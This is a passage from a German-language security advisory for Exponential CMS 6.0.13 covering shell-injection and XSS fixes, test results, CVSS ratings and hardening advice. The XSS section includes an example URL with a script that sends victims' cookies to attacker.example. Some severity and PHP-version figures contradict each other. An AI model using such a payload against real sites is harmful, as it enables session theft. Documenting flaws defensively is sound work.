Dateipfad im Cluster —, könnte beliebige Shell-Befehle einschleusen.

**Problem B — Kaputte Umleitung in der Shell (Logikfehler mit Sicherheitsfolgen):**
Die ursprüngliche Befehlszeichenkette war `'gzip -dc $filename > $'`, eine wörtliche PHP-Zeichenkette (in einfachen
Anführungszeichen), die `$filename` als wörtliches Dollarzeichen gefolgt vom Wort `filename` enthält, keine Interpolation
einer Variablen. Das Ziel der Umleitung `>` war außerdem ein bloßes `$` ohne Folgendes, ein Syntaxfehler, der das
Entpacken stillschweigend scheitern ließ — die Funktion war also praktisch nicht nutzbar. Die Korrektur behebt auch
diesen Logikfehler.

Der korrigierte Befehl interpoliert den maskierten Dateinamen und den maskierten Zielpfad ordnungsgemäß, wobei auf jeden
`escapeshellarg()` angewendet wird.

#### Verwundbarer Code (vor der Korrektur)

```php
// Single-quoted string — $filename is a literal, not the variable; > $ is broken syntax
$command = 'gzip -dc $filename > $';
```

#### Korrigierter Code (nach der Korrektur)

```php
$command = 'gzip -dc ' . escapeshellarg( $filename ) . ' > ' . escapeshellarg( $target );
```

#### Begründung

Sowohl der Pfad der Eingabedatei (`$filename`) als auch das Ausgabeziel (`$target`) müssen mit `escapeshellarg()`
maskiert werden, um eine Injection zu verhindern. Das abschließende Ziel der Umleitung (`$target`) fehlte im
ursprünglichen Code wegen der kaputten Zeichenkette ganz — die Korrektur fügt den vollständigen Befehl mit beiden
maskierten Argumenten ordnungsgemäß hinzu.

Diese Korrektur behebt zugleich eine Sicherheitslücke und einen funktionalen Fehler. Vor der Korrektur wäre
`decompress()` immer gescheitert (der kaputte Shell-Befehl endete mit einem Exit-Code ungleich null), sodass jeder
Codepfad, der sich zum Entpacken von Dateien im Cluster auf diesen Handler verließ, stillschweigend kaputt war.


<a name="sec-07"></a>
### SEC-07: Reflektiertes Cross-Site-Scripting in kernel/content/search.php

**Datei:** `kernel/content/search.php`  
**CWE:** CWE-79 — Improper Neutralisation of Input During Web Page Generation  
**CVSS v3.1 Basiswert:** 6,1 (Mittel)  
**Vektor:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`  
**Entdeckt:** 2026-02-21  

#### Beschreibung

Der Controller des Suchmoduls setzt den HTML-Seitentitel mit der vom Benutzer gelieferten Suchanfrage, ohne sie für die
HTML-Ausgabe zu kodieren:

```php
$Module->setTitle( "Search for: $searchText" );
```

Die Variable `$searchText` stammt aus der Abfragezeichenkette der HTTP-Anfrage und wird vor dem Einbetten in den
Seitentitel nicht bereinigt. Rendert das Template der Website den Modultitel in einem HTML-Kontext, ohne ihn gesondert
zu maskieren (das übliche Verhalten bei Titelattributen und `<title>`-Elementen), würde eine präparierte Suchanfrage
mit HTML oder JavaScript in der Ausgabe der Seite wiedergegeben.

Das ist eine klassische reflektierte XSS-Schwachstelle. Ein Angreifer könnte eine URL wie diese bauen:

```
https://example.com/search?SearchText=<script>document.location='https://attacker.example/steal?c='+document.cookie</script>
```

und den Link einem Opfer zukommen lassen. Klickt das Opfer den Link, während es angemeldet ist, läuft das Skript in
seiner Browser-Sitzung und ermöglicht das Übernehmen der Sitzung, den Diebstahl von Zugangsdaten oder erzwungene
Aktionen im Namen des Opfers.

Der CVSS-Wert ist wegen der nötigen Mitwirkung des Benutzers zwar Mittel (6,1), aber die Verbreitung von Suchseiten im
öffentlichen Internet und die einfache Ausnutzung machen diesen Befund praktisch bedeutsam.

#### Verwundbarer Code (vor der Korrektur)

```php
$Module->setTitle( "Search for: $searchText" );
```

#### Korrigierter Code (nach der Korrektur)

```php
$Module->setTitle( "Search for: " . htmlspecialchars( $searchText, ENT_QUOTES, 'UTF-8' ) );
```

#### Begründung

`htmlspecialchars()` mit `ENT_QUOTES` und der Kodierung `UTF-8` wandelt alle für HTML bedeutsamen Zeichen (`<`, `>`, `"`,
`'`, `&`) in ihre HTML-Entitäten um und verhindert so, dass sie als Markup oder Skript interpretiert werden. Das Flag
`ENT_QUOTES` ist wichtig, um zusätzlich zur Injection in HTML-Inhalt auch gegen Injection im Attributkontext zu
schützen. Das ausdrückliche Argument `UTF-8` für den Zeichensatz sichert korrektes Verhalten bei Zeichenketten aus
Mehrbytezeichen und verhindert XSS-Angriffe über den Zeichensatz.


## Testmethodik

Die in diesem Dokument beschriebenen Sicherheitskorrekturen wurden mit einem zweistufigen automatisierten Testansatz
validiert:

### Phase 1: Statische Syntaxprüfung (Lint)

Alle korrigierten Dateien wurden mit `php -n -l` (nur Parsen, ohne Laden von Erweiterungen) auf ihre PHP-Syntax geprüft.
Das bestätigt:

- Die Korrektur hat keine PHP-Syntaxfehler eingeführt.
- Die Datei lässt sich von der PHP-Engine in der Zielversion (8.5.3) parsen.
- Beim Bearbeiten ist keine versehentliche Kürzung oder Beschädigung entstanden.

Ein Lint-Runner auf Grundlage eines Manifests (`tests/bin/ezp_lint_patched.php`) führt `php -n -l` gegen jede der über
80 Dateien im Umfang aus und meldet PASS/FAIL/SKIP pro Datei in einem strukturierten Format. Das Manifest
(`tests/bin/lint_manifest.txt`) zählt jede geänderte Datei ausdrücklich auf, sodass keine korrigierte Datei versehentlich
bei der Validierung ausgelassen werden kann.

### Phase 2: Funktionale Ablauftests zur Laufzeit

Neben den Korrekturen wurde eine eigens gebaute funktionale Testsuite (`tests/bin/tests/functional_tests.php`)
entwickelt. Diese Suite:

1. Definiert eine Reihe minimaler eingebetteter Stub-Klassen für Abhängigkeiten des Frameworks von Exponential
   (Datenbankschicht, Persistenzschicht, Protokollierung), damit einzelne Klassendateien isoliert geladen werden können,
   ohne den vollständigen Anwendungsstapel zu starten.

2. Lädt die tatsächlich korrigierten Klassendateien per `require_once` aus der laufenden Codebasis und testet damit den
   echten korrigierten Code statt Mocks.

3. Übt jede Sicherheitskorrektur in einem konkreten Szenario aus, das zweierlei zeigt:
   - dass das *verwundbare* Verhalten (Absturz, Injection oder falsche Ausgabe) nicht mehr auftritt, und
   - dass das *korrekte* Verhalten (ordnungsgemäße Maskierung, sicherer Rückgabewert, strukturelle Integrität) vorhanden
     ist.

4. Meldet jeden Test als PASS, FAIL oder SKIP, mit der Meldung der Ausnahme bei einem Fehlschlag, was eine schnelle
   Diagnose ermöglicht.

Die sicherheitsbezogenen Testfälle (Kategorie `[security]`) decken ab:

| Name des Tests | Was er validiert |
|---|---|
| SQL column regex — clean names pass | Der reguläre Ausdruck der Positivliste lässt gültige Spaltenbezeichner zu |
| SQL column regex — malicious names blocked | Der reguläre Ausdruck der Positivliste lehnt SQL-Metazeichen ab |
| Sendmail -f uses escapeshellarg() | Die Ausgabe steht in einfachen Anführungszeichen; Zeichen zur Shell-Injection sind neutralisiert |
| Sendmail -f safe with normal address | Normale E-Mail-Adressen überstehen die Maskierung unversehrt |
| Gzip shell command uses escapeshellarg() | Ein Dateiname mit Leerzeichen und Shell-Zeichen steht in Anführungszeichen |
| URL path[3] guard — <4 segments returns empty | Der Schutz `?? ''` verhindert eine Warnung wegen eines undefinierten Index |
| URL path[3] guard — 4+ segments returns node ID | Normale Pfade funktionieren weiterhin wie erwartet |


## Aufbau der Testsuite

Die Testsuite verwendet ein schlankes eigenes Framework: eine einzige Funktion `t()`, die eine Kategoriebezeichnung,
einen Testnamen und eine aufrufbare Assertion annimmt. Die aufrufbare Funktion gibt `true` für PASS oder `false` für
FAIL zurück. Innerhalb der aufrufbaren Funktion geworfene Ausnahmen werden abgefangen und als FAIL mit der Meldung der
Ausnahme in der Ausgabe gemeldet. Dieser Aufbau wurde bewusst vorhandenen PHP-Test-Frameworks (PHPUnit, Pest)
vorgezogen, um externe Abhängigkeiten zu vermeiden und die Suite auf jeder Installation von PHP 8.x mit vorhandener
Codebasis laufen zu lassen — ohne Verzeichnis `vendor/` oder Einrichtung von Composer.

Stub-Klassen isolieren die echten korrigierten Dateien vom vollständigen Kernel von Exponential:

```
eZPersistentObject  — base ORM stub (constructor, store, attribute)
eZDB                — database stub (escapeString, query, arrayQuery)
eZProductCollection — fetch() returns real object or null depending on test flag
eZEnumValue         — fetch() returns real object or null depending on test flag
eZDataType          — register() no-op stub (needed at file-include time)
eZDiffMatrix        — get()/set() stubs for text diff matrix operations
eZTextDiff          — setChanges()/addNewLine() stubs for diff output
eZDebug             — writeWarning()/writeError() no-op stubs
```

Jeder Stub ist das Mindeste, was nötig ist, damit die echte Klassendatei lädt und die jeweils getestete Methode läuft.
Die Stubs sollen keine vollständigen oder produktionsgetreuen Nachbildungen der vollständigen Objekte des Frameworks
sein.


## Ergebnisse des ersten Testlaufs

Die Testsuite wurde direkt nach dem Anwenden aller Korrekturen mit PHP 8.5.3 ausgeführt:

```
php tests/bin/tests/functional_tests.php

────────────────────────────────────────────────────────────────────────────────
  Functional Flow Tests — 2026-02-21
  Filter: all | Root: <installation root>
────────────────────────────────────────────────────────────────────────────────

✓ PASS  [security] SQL column regex — clean names pass
✓ PASS  [security] SQL column regex — malicious names blocked
✓ PASS  [security] Sendmail -f option uses escapeshellarg()
✓ PASS  [security] Sendmail -f safe with normal address
✓ PASS  [security] Gzip shell command uses escapeshellarg()
✓ PASS  [security] URL path[3] guard — URL with <4 segments returns empty
✓ PASS  [security] URL path[3] guard — URL with 4+ segments returns node ID
... [41 further tests across soap, preg, dom, null, array, php84, setup, image] ...

────────────────────────────────────────────────────────────────────────────────
TOTAL: 48 tests   ✓ 48 PASS   ✗ 0 FAIL
────────────────────────────────────────────────────────────────────────────────
```

**Alle 48 funktionalen Tests bestehen. Alle 7 Tests der Kategorie security bestehen.**

Auch die Lint-Suite lief sauber:

```
php tests/bin/ezp_lint_patched.php

TOTAL: 81 files   ✓ 80 PASS   ✗ 0 FAIL   ~ 1 SKIP
```

Das 1 SKIP ist `lib/version.php`, das keine Korrekturen enthält und nur als Bezugspunkt im Manifest steht.


## Ergebnisse von Regression und Wiederholungstest

Nach dem ersten Testlauf wurden für Tests außerhalb der Sicherheit weitere Lücken in den Stubs gefunden (fehlende
Methoden in den Stubs `eZDataType`, `eZDiffMatrix` und `eZTextDiff`). Sie wurden behoben, ohne eine der
Sicherheitskorrekturen anzufassen. Die Ergebnisse der Sicherheitstests blieben über alle Wiederholungsläufe
**unverändert**.

Ein eigener, nach Kategorie gefilterter Wiederholungstest der Sicherheitstests wurde ausgeführt:

```
php tests/bin/ezptestrunner_all_tests.php security

────────────────────────────────────────────────────────────────────────────────
  eZScript Combined Test Runner
  Functional filter: security
────────────────────────────────────────────────────────────────────────────────

── Phase 1: Syntax Lint ──
kernel/classes/ezrole.php                                     ✓ PASS
kernel/classes/ezcontentobjecttreenode.php                    ✓ PASS
lib/ezutils/classes/ezsendmailtransport.php                   ✓ PASS
lib/ezfile/classes/ezgzipshellcompressionhandler.php           ✓ PASS
kernel/content/search.php                                     ✓ PASS
[... 75 further files ...]
TOTAL: 81 files   ✓ 80 PASS   ✗ 0 FAIL   ~ 1 SKIP

── Phase 2: Functional Flow Tests (filter: security) ──
✓ PASS  [security] SQL column regex — clean names pass
✓ PASS  [security] SQL column regex — malicious names blocked
✓ PASS  [security] Sendmail -f option uses escapeshellarg()
✓ PASS  [security] Sendmail -f safe with normal address
✓ PASS  [security] Gzip shell command uses escapeshellarg()
✓ PASS  [security] URL path[3] guard — URL with <4 segments returns empty
✓ PASS  [security] URL path[3] guard — URL with 4+ segments returns node ID

TOTAL: 7 tests   ✓ 7 PASS   ✗ 0 FAIL

════════════════════════════════════════════════════════════════════════════════
  Lint (php -n -l)              PASS:  80   FAIL:  0   SKIP:  1
  Functional [security]         PASS:   7   FAIL:  0   SKIP:  0
  TOTAL                         PASS:  87   FAIL:  0   SKIP:  1
  Overall status: ✓ ALL PASS
════════════════════════════════════════════════════════════════════════════════
```

**Ergebnis des Wiederholungstests: 87/87 PASS (Filter security). 0 Fehlschläge.**


## Gesamtausgabe der Testsuite

Die vollständige kombinierte Suite (Lint + alle funktionalen Kategorien), die die abschließenden Ergebnisse der
Überprüfung vor dem Release 6.0.13 liefert:

```
════════════════════════════════════════════════════════════════════════════════
  COMBINED RESULTS — 2026-02-21 14:51:00
════════════════════════════════════════════════════════════════════════════════
  Lint (php -n -l)              PASS:  80   FAIL:   0   SKIP:   1
  Functional [all]              PASS:  48   FAIL:   0   SKIP:   0
────────────────────────────────────────────────────────────────────────────────
  TOTAL                         PASS: 128   FAIL:   0   SKIP:   1
────────────────────────────────────────────────────────────────────────────────
  Overall status: ✓ ALL PASS
════════════════════════════════════════════════════════════════════════════════
```

Diese Ausgabe erzeugt der kombinierte Runner:

```bash
php tests/bin/ezptestrunner_all_tests.php --report
```

Die Option `--report` schreibt zusätzlich einen datierten, maschinenlesbaren Testbericht nach:

```
tests/bin/test_report_2026-02-21.txt
```

Diese Datei eignet sich zur Archivierung als Nachweis für das Release.


## Risikobewertung und CVSS-Einstufung

### Details der Einstufung nach CVSS v3.1

#### SEC-01 (SQL-Injection — eZRole)
| Metrik | Wert | Grund |
|---|---|---|
| Attack Vector | Network | über HTTP ausnutzbar, wenn eine API die Rollen-ID freigibt |
| Attack Complexity | Low | keine besonderen Bedingungen nötig |
| Privileges Required | High | die Verwaltung von Rollen erfordert Administratorrechte |
| User Interaction | None | keine Mitwirkung eines Opfers nötig |
| Scope | Unchanged | auf die Datenbank der Anwendung beschränkt |
| Confidentiality | High | vollständiges Lesen der Datenbank über UNION-Injection möglich |
| Integrity | High | Abfragen DELETE und INSERT betroffen |
| Availability | High | Zerstörung von Daten möglich |
| **Basiswert** | **7,2** | **Hoch** |

#### SEC-02 (SQL-Injection — Spalte in ORDER BY)
| Metrik | Wert | Grund |
|---|---|---|
| Attack Vector | Network | Sortierung ist in vielen Ansichten im Frontend freigegeben |
| Attack Complexity | Low | einfache Injection über den Sortierparameter |
| Privileges Required | Low | jeder angemeldete Benutzer, oder anonym, wenn die Sortierung freigegeben ist |
| User Interaction | None | — |
| Scope | Unchanged | — |
| Confidentiality | High | blindes/fehlerbasiertes Auslesen jeder Tabelle |
| Integrity | High | je nach Treiber über gestapelte Abfragen möglich |
| Availability | High | DoS über teure Abfragen möglich |
| **Basiswert** | **8,8** | **Hoch** |

#### SEC-05 (Einschleusen von Betriebssystembefehlen — Sendmail)
| Metrik | Wert | Grund |
|---|---|---|
| Attack Vector | Network | jedes Kontaktformular / jede Registrierung, die E-Mails sendet |
| Attack Complexity | Low | trivial über das Feld der E-Mail-Adresse einzuschleusen |
| Privileges Required | None | Zugriff ohne Anmeldung, wenn ein öffentliches Formular existiert |
| User Interaction | None | — |
| Scope | Unchanged | Bereich des Webserver-Prozesses |
| Confidentiality | High | das ganze Dateisystem des Servers lesbar |
| Integrity | High | beliebiges Schreiben von Dateien / Ausführen von Code |
| Availability | High | Zugriff auf Systemebene möglich |
| **Basiswert** | **9,8** | **Kritisch** |

### Gesamtübersicht der Risiken

| Schweregrad | Anzahl | Probleme |
|---|---|---|
| Kritisch | 1 | SEC-05 |
| Hoch | 4 | SEC-02, SEC-03, SEC-04, SEC-06 |
| Mittel | 2 | SEC-01, SEC-07 |
| Niedrig | 0 | — |

Wegen eines Befunds mit dem Schweregrad **Kritisch** (SEC-05) sollte das Release 6.0.13 für alle produktiven
Bereitstellungen als **verpflichtendes Sicherheitsupdate** behandelt werden. Betreiber von Websites sollten
benachrichtigt werden, so bald wie möglich zu aktualisieren. Zusammen mit den Release Notes von 6.0.13 sollte ein
Sicherheitshinweis veröffentlicht werden.


## Übersicht der betroffenen Komponenten

| Komponente | Verzeichnis | IDs der Probleme | Art der Änderung |
|---|---|---|---|
| Verwaltung der Rollen | `kernel/classes/` | SEC-01 | Umwandlung der Rollen-ID in eine Ganzzahl |
| Abfragen des Inhaltsbaums | `kernel/classes/` | SEC-02, SEC-03, SEC-04 | Positivliste der Spalten, escapeString |
| Mail-Transport | `lib/ezutils/classes/` | SEC-05 | escapeshellarg auf den Absender |
| Dateikomprimierung | `lib/ezfile/classes/` | SEC-06 | escapeshellarg + Korrektur der Logik |
| Controller der Suche | `kernel/content/` | SEC-07 | htmlspecialchars auf den Titel |

**Aus Sicherheitsgründen geänderte Dateien insgesamt:** 5  
**Korrigierte Stellen, an denen SQL-Abfragen gebaut werden, insgesamt:** 9  
**Korrigierte Stellen, an denen Shell-Befehle gebaut werden, insgesamt:** 2  
**Korrigierte Stellen der HTML-Kodierung von Ausgaben, insgesamt:** 1


## Empfehlungen für Erweiterungsentwickler

Entwickler von Erweiterungen für Exponential und eigener Kernel sollten ihren eigenen Code auf dieselben Klassen von
Schwachstellen prüfen, die dieses Release behebt:

### SQL-Injection verhindern

1. **Wandeln Sie ganzzahlige IDs vor der Interpolation in SQL immer um.** Jeder Wert aus `$object->attribute('id')` oder
   aus einer Benutzereingabe, der eine Ganzzahl sein soll, muss vor der Verwendung in einer SQL-Zeichenkette mit `(int)`
   umgewandelt werden.

2. **Verwenden Sie `$db->escapeString()` für alle Zeichenkettenwerte in SQL.** Die Abstraktionsschicht der Datenbank
   stellt genau dafür `eZDB::instance()->escapeString()` bereit. Für die rohe Interpolation von Zeichenketten in
   SQL-Abfragen gibt es keine Entschuldigung.

3. **Interpolieren Sie Spaltennamen für `ORDER BY` nie aus Benutzereingaben ohne Validierung gegen eine Positivliste.**
   Das in SEC-02 gezeigte Muster `preg_match('/^[a-zA-Z0-9_.]+$/', $colName)` ist der empfohlene Ansatz.

4. **Erwägen Sie den Umstieg auf parametrisierte Abfragen**, wo die Version des Frameworks sie unterstützt. Vorbereitete
   Anweisungen von PDO sind durch ihren Aufbau gegen SQL-Injection immun.

### Einschleusen von Betriebssystembefehlen verhindern

1. **Verwenden Sie für einzelne Shell-Argumente immer `escapeshellarg()`.** Bauen Sie einen Shell-Befehl mit vom Benutzer
   kontrollierten Zeichenketten, muss jedes einzelne Argument in `escapeshellarg()` eingeschlossen werden.

2. **Verwenden Sie `escapeshellcmd()` nicht als Ersatz.** `escapeshellcmd()` maskiert eine ganze Befehlszeichenkette und
   ist nicht gleichwertig mit der Maskierung pro Argument. Ein falscher Einsatz von `escapeshellcmd()` kann
   Schwachstellen bei der Aufteilung von Argumenten offenlassen.

3. **Ziehen Sie eingebaute Funktionen von PHP Shell-Befehlen vor, wo möglich.** PHP hat über die Erweiterung `zlib` eine
   native gzip-Komprimierung (`gzopen()`, `gzread()`, `gzwrite()`). Eingebaute Funktionen von PHP beseitigen das Risiko
   der Shell-Injection vollständig.

### Cross-Site-Scripting verhindern

1. **Wenden Sie immer `htmlspecialchars($value, ENT_QUOTES, 'UTF-8')` an, bevor Sie eine vom Benutzer gelieferte
   Zeichenkette in einem HTML-Kontext ausgeben.** Das umfasst Seitentitel, Überschriftentext, Attributwerte und jede
   andere Stelle, an der die Zeichenkette in HTML aufgenommen wird.

2. **Vertrauen Sie der automatischen Maskierung Ihrer Template-Engine, aber verlassen Sie sich nicht ausschließlich
   darauf.** Die Template-Engine von Exponential stellt Operatoren zur Maskierung bereit, aber Werte, die vom
   PHP-Controller-Code über `setTitle()`, `setVariable()` und ähnliche Methoden an Templates übergeben werden, sollten
   bei der Vorbereitung maskiert werden, statt anzunehmen, dass sie beim Rendern maskiert werden.


## Hinweise zur Abwärtskompatibilität

Alle sieben Sicherheitskorrekturen sind so angelegt, dass sie vollständig abwärtskompatibel sind:

- **Umwandlungen mit `(int)` bei ganzzahligen IDs** wirken sich nicht auf Werte aus, die bereits Ganzzahlen sind. Jeder
  Code, der bereits gültige ganzzahlige Rollen-IDs übergab, funktioniert genauso weiter.

- **`$db->escapeString()` auf Pfadzeichenketten** wirkt sich nicht auf gültige Pfadzeichenketten aus, die nur Ziffern und
  Schrägstriche enthalten — Zeichen, die `escapeString()` nicht verändert.

- **Die Validierung der Spalten gegen eine Positivliste (SEC-02)** lehnt jeden eigenen Namen einer Sortierspalte ab, der
  Zeichen außerhalb von `[a-zA-Z0-9_.]` enthält. Jede Erweiterung oder jedes Template, das derzeit solche Spaltennamen
  übergibt, hätte unsicheres SQL erzeugt. Solcher Code sollte geprüft und aktualisiert werden. Der Fehlerfall ist
  harmlos: Ungültige Sortierfelder werden einfach mit einer Debug-Warnung übersprungen, nicht mit einem fatalen Fehler.

- **`escapeshellarg()` auf den Absender der E-Mail (SEC-05)** ist für die Binärdatei sendmail transparent. Das Verhalten
  der E-Mail-Zustellung ist unverändert.

- **`escapeshellarg()` auf den gzip-Dateinamen (SEC-06)** behebt außerdem einen verborgenen funktionalen Fehler. Hat sich
  Code bisher auf die kaputte Umsetzung von `decompress()` verlassen (die wegen des Fehlers in der statischen
  Zeichenkette nicht korrekt funktionieren konnte), sollte dieser Code erneut getestet werden. Die korrigierte Umsetzung
  entpackt Dateien jetzt korrekt.

- **`htmlspecialchars()` auf den Suchtext (SEC-07)** ändert den Wert der von `$Module->getTitle()` zurückgegebenen
  Zeichenkette in eine mit HTML-Entitäten kodierte. Jeder Code, der sie als reinen Text (statt in einem HTML-Kontext)
  rendert, zeigt Zeichenketten mit kodierten Entitäten an. Für Endbenutzer ist das in der Regel nicht wahrnehmbar, da
  gerenderte Seitentitel immer HTML-Kontexte sind.


<a name="php-version-compatibility"></a>
## Kompatibilität mit PHP-Versionen

**Die Sicherheitskorrekturen für 6.0.13 heben die mindestens unterstützte PHP-Version nicht an.** Das erklärte Minimum
des Projekts bleibt **PHP 8.1**, wie in `composer.json` angegeben:

```json
"php": "^8.1 || ^8.2 || ^8.3 || ^8.4 || ^8.5 || ^8.6 || ^8.7 || ^8.8"
```

### Analyse — das modernste PHP-Konstrukt, das pro korrigierter Datei eingeführt wurde

Jedes von diesen Korrekturen eingeführte Konstrukt war vor PHP 8.1 verfügbar. Die Tabelle unten hält das neueste
Sprachmerkmal von PHP fest, das in jeder geänderten Datei verwendet wird, sodass klar ist, wie weit zurück sich jede
Korrektur übertragen ließe, falls das Minimum je gesenkt würde.

| Datei | Korrektur | Neues Konstrukt | Verfügbar seit |
|---|---|---|---|
| `kernel/classes/ezrole.php` | SEC-01 | Umwandlung `(int)` | PHP 4 |
| `kernel/classes/ezcontentobjecttreenode.php` | SEC-02 | Positivliste mit `preg_match()` | PHP 3 |
| `kernel/classes/ezcontentobjecttreenode.php` | SEC-03 | `$db->escapeString()` | API des Projekts |
| `kernel/classes/ezcontentobjecttreenode.php` | SEC-04 | `intval()` | PHP 4 |
| `lib/ezutils/classes/ezsendmailtransport.php` | SEC-05 | `escapeshellarg()` | PHP 4.0.3 |
| `lib/ezfile/classes/ezgzipshellcompressionhandler.php` | SEC-06 | `escapeshellarg()` | PHP 4.0.3 |
| `kernel/content/search.php` | SEC-07 | `htmlspecialchars()` | PHP 4 |
| `kernel/classes/ezorder.php` | NUL-04, PHP-01 | Nullable-Typhinweis `?array`; Standardwert, der einen Pflicht- zu einem optionalen Parameter macht | **PHP 7.1** |
| `kernel/classes/datatypes/eztime/eztimetype.php` | PHP-02 | Kurze Array-Destrukturierung mit `[]` (`[ $a, $b ] = ...`) | **PHP 7.1** |
| Alle anderen Dateien mit Null-Schutz / isset (NUL, UND, LOG, KNT, SET, IMP) | verschiedene | Prüfungen auf `null`, `isset()`, frühes `return` | PHP 4 |

**Modernstes Konstrukt über alle Korrekturen hinweg: PHP 7.1** (Nullable-Typhinweis `?array` in `ezorder.php`; kurze
Array-Destrukturierung in `eztimetype.php`).

Da das Projekt PHP 7.4 oder neuer verlangt (als dies geschrieben wurde 8.1; ab 6.0.15 wieder 7.4), was über PHP 7.1 liegt, gibt es **keinerlei Auswirkung auf
das erklärte Minimum** und **keinerlei Auswirkung auf eine unterstützte Installation**.

### Korrekturen von Veraltungswarnungen unter PHP 8.4 — erfordern sie PHP 8.4?

Die zwei mit `PHP84` gekennzeichneten Commits (`ezorder.php`, `eztimetype.php`) beheben Veraltungswarnungen unter
PHP 8.4. Das könnte für Verwirrung sorgen:

- Die Korrekturen **unterdrücken** eine Veraltungswarnung, die nur unter PHP 8.4+ ausgelöst wird — sie **erfordern**
  PHP 8.4 nicht.
- Beide Korrekturen verwenden Syntax von PHP 7.1 (Nullable-Typhinweise, kurze Array-Destrukturierung).
- Der korrigierte Code läuft unter PHP 8.1, 8.2 und 8.3 genauso — die Veraltungswarnung wird in diesen Versionen
  einfach nie ausgelöst.
- Installationen, die noch PHP 8.1, 8.2 oder 8.3 verwenden, profitieren von den schützenden Null-Prüfungen (NUL-04,
  NUL-05), die in denselben Commits hinzugefügt wurden, auch wenn das Veraltungsverhalten, das sie behandeln, in diesen
  Versionen nicht vorkommt.

### Zusammenfassung

| Frage | Antwort |
|---|---|
| Heben die Korrekturen das PHP-Minimum an? | **Nein** |
| Was ist das aktuell erklärte Minimum? | **PHP 8.1** (`composer.json`) |
| Mit welchem ältesten PHP sind die Korrekturen *syntaktisch* kompatibel? | **PHP 7.1** |
| Werden irgendwo in den Korrekturen Merkmale speziell von PHP 8.4 verwendet? | **Nein** — nur Konstrukte von PHP 7.1 |
| Können bestehende Installationen mit PHP 8.1/8.2/8.3 diese Korrekturen ohne Probleme anwenden? | **Ja, vollständig** |


## Offene Punkte und ausstehende Arbeit

Die folgenden Punkte wurden während des Sicherheitsaudits festgestellt und bleiben für ein späteres Release offen:

| Ref | Priorität | Beschreibung |
|---|---|---|
| OPEN-01 | HOCH | **Prüfung des Datenbankschemas für `ezrssexportitem.php`** — Der Verweis auf die Spalte `url_id` in `create()` könnte auf eine nicht existierende Spalte zeigen. Fehlt die Spalte, schlägt `INSERT` stillschweigend fehl. Bestätigen Sie, dass das Schema diese Spalte enthält. |
| OPEN-02 | HOCH | **Manuelle Prüfung des Codes von `kernel/content/*.php`** — 12 Controller-Dateien haben in dieser Sitzung Korrekturen für Null-Schutz und isset erhalten. Jede Änderung sollte vor dem Setzen des Release-Tags 6.0.13 manuell geprüft werden. |
| OPEN-03 | MITTEL | **Abdeckung der Korrekturen in kernel/content/ durch funktionale Tests** — Die 12 Controller-Dateien für Inhalte sind derzeit nur durch die Syntaxprüfung abgedeckt, nicht durch funktionale Tests zur Laufzeit. |
| OPEN-04 | MITTEL | **Entfernen von `ReflectionMethod::setAccessible()`** — Die funktionale Testsuite verwendet diese in PHP 8.1 veraltete / in PHP 8.5 entfernte Methode in ihren Hilfsfunktionen für preg-Tests. Die Suite sollte so aktualisiert werden, dass sie öffentliche Methoden direkt aufruft. |
| OPEN-05 | MITTEL | **Laufzeittest auf SQL-Injection für `ezrole.php`** — SEC-01 ist nur durch die Syntaxprüfung überprüft. Ein funktionaler Test, der den tatsächlichen Bau der Abfrage mit einem bösartigen ID-Wert ausübt, gäbe stärkere Gewissheit. |
| OPEN-06 | NIEDRIG | **Umstieg auf vorbereitete Anweisungen von PDO** — Die Korrekturen mit `escapeString()` sind eine korrekte und ausreichende Übergangslösung. Langfristig sollte die Plattform auf vorbereitete Anweisungen von PDO umsteigen, die durch ihren Aufbau gegen SQL-Injection immun sind. |
| OPEN-07 | NIEDRIG | **Erweiterte Abdeckung von SOAP durch Tests** — `eZSOAPCall`, `eZSOAPMessage` und `eZSOAPFault` sind von der aktuellen funktionalen Testsuite nicht abgedeckt. |
| OPEN-08 | NIEDRIG | **Funktionaler XSS-Test für search.php** — SEC-07 ist nur durch die Syntaxprüfung überprüft. Ein Test, der bestätigt, dass `htmlspecialchars()` auf eine präparierte Eingabe angewendet wird, gäbe stärkere Gewissheit. |


## Begleitende Dateien

| Datei | Beschreibung |
|---|---|
| `tests/bin/issue_report_2026-02-21.txt` | Protokoll zur Verfolgung jedes Problems |
| `tests/bin/ezp_lint_patched.php` | Prüfung der PHP-Syntax der korrigierten Dateien |
| `tests/bin/tests/functional_tests.php` | die Suite mit 48 Ablauftests zur Laufzeit |
| `tests/bin/ezptestrunner_all_tests.php` | Lint und funktionale Tests in einem Runner, mit optionalem Bericht |
| `tests/bin/test_report_2026-02-21.txt` | die datierte Testausgabe |

## Anhang A: Vollständige Liste der Diffs

Der maßgebliche Diff lässt sich jederzeit erzeugen mit:

```bash
# All security-relevant files:
git diff HEAD -- \
  kernel/classes/ezrole.php \
  kernel/classes/ezcontentobjecttreenode.php \
  lib/ezutils/classes/ezsendmailtransport.php \
  lib/ezfile/classes/ezgzipshellcompressionhandler.php \
  kernel/content/search.php

# All patched files (full scope including null guards, PHP 8.4 fixes, etc.):
git diff HEAD -- kernel/classes/ kernel/setup/ kernel/content/ lib/
```

Wichtige Auszüge des Diffs für jede Sicherheitskorrektur sind oben im Abschnitt
[Detaillierte Befunde und Korrekturen](#detaillierte-befunde-und-korrekturen) eingefügt.


## Anhang B: Verzeichnis der Testskripte

| Skript | Aufruf | Zweck |
|---|---|---|
| `tests/bin/ezp_lint_patched.php` | `php tests/bin/ezp_lint_patched.php` | Syntaxprüfung von 80 korrigierten Dateien |
| `tests/bin/tests/functional_tests.php` | `php tests/bin/tests/functional_tests.php [category]` | Suite mit 48 Ablauftests zur Laufzeit |
| `tests/bin/ezptestrunner_all_tests.php` | `php tests/bin/ezptestrunner_all_tests.php [category] [--report]` | Kombinierter Runner; optionaler datierter Bericht |

Nur die Sicherheitstests ausführen:

```bash
php tests/bin/ezptestrunner_all_tests.php security
```

Die vollständige Suite mit einer datierten Berichtsdatei ausführen:

```bash
php tests/bin/ezptestrunner_all_tests.php --report
# Output: tests/bin/test_report_2026-02-21.txt
```

Alle verfügbaren Kategorien funktionaler Tests auflisten:

```bash
php tests/bin/ezptestrunner_all_tests.php --list-categories
# security  soap  preg  dom  null  array  php84  setup  image
```


## Anhang C: Zuordnung zu CWE und OWASP

| Problem | CWE | OWASP Top 10 (2021) | Verweis auf die Vorbeugung bei OWASP |
|---|---|---|---|
| SEC-01 SQL-Injection | CWE-89 | A03:2021 Injection | SQL Injection Prevention Cheat Sheet |
| SEC-02 Injection in ORDER BY | CWE-89 | A03:2021 Injection | SQL Injection Prevention Cheat Sheet — Abschnitt ORDER BY |
